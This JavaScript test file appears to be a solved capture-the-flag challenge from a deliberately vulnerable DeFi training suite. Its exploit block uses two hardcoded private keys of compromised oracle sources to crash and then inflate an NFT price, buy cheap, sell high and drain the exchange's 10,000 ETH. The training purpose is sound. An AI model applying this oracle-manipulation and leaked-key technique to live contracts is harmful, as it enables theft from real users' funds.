const { ether, balance } = require('@openzeppelin/test-helpers')
const { accounts, contract, web3 } = require('@openzeppelin/test-environment')

const Exchange = contract.fromArtifact('Exchange')
const DamnValuableNFT = contract.fromArtifact('DamnValuableNFT')
const TrustfulOracle = contract.fromArtifact('TrustfulOracle')
const TrustfulOracleInitializer = contract.fromArtifact('TrustfulOracleInitializer')

const { expect } = require('chai')

describe('Compromised challenge', function () {
  const sources = [
    '0xA73209FB1a42495120166736362A1DfA9F95A105',
    '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
    '0x81A5D6E50C214044bE44cA0CB057fe119097850c',
  ]

  const [deployer, attacker] = accounts
  const EXCHANGE_INITIAL_ETH_BALANCE = ether('10000')
  const INITIAL_NFT_PRICE = ether('999')

  before(async function () {
    /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

    // Fund the trusted source addresses
    await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') })
    await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') })
    await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') })

    // Deploy the oracle and setup the trusted sources with initial prices
    this.oracle = await TrustfulOracle.at(
      await (
        await TrustfulOracleInitializer.new(
          sources,
          ['DVNFT', 'DVNFT', 'DVNFT'],
          [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
          { from: deployer }
        )
      ).oracle()
    )

    // Deploy the exchange and get the associated ERC721 token
    this.exchange = await Exchange.new(this.oracle.address, { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE })
    this.token = await DamnValuableNFT.at(await this.exchange.token())
  })

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    // Load compromised private key
    const PRIVATE_KEY_1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'
    const PRIVATE_KEY_2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
    const compromisedAccount1 = await web3.eth.personal.importRawKey(PRIVATE_KEY_1, '')
    const compromisedAccount2 = await web3.eth.personal.importRawKey(PRIVATE_KEY_2, '')
    await web3.eth.personal.unlockAccount(compromisedAccount1, '', 1000)
    await web3.eth.personal.unlockAccount(compromisedAccount2, '', 1000)

    // Drop oracle price
    await this.oracle.postPrice('DVNFT', 0, { from: compromisedAccount1 })
    await this.oracle.postPrice('DVNFT', 0, { from: compromisedAccount2 })

    // Make NFT purchase
    await this.exchange.buyOne({ from: attacker, value: 1 })

    // Inflate oracle price
    await this.oracle.postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE, { from: compromisedAccount1 })
    await this.oracle.postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE, { from: compromisedAccount2 })

    // Sell NFT
    await this.token.approve(this.exchange.address, 1, { from: attacker })
    await this.exchange.sellOne(1, { from: attacker })
  })

  after(async function () {
    // Exchange must have lost all ETH
    expect(await balance.current(this.exchange.address)).to.be.bignumber.eq('0')
    expect(await balance.current(attacker)).to.be.bignumber.gt(EXCHANGE_INITIAL_ETH_BALANCE)
  })
})
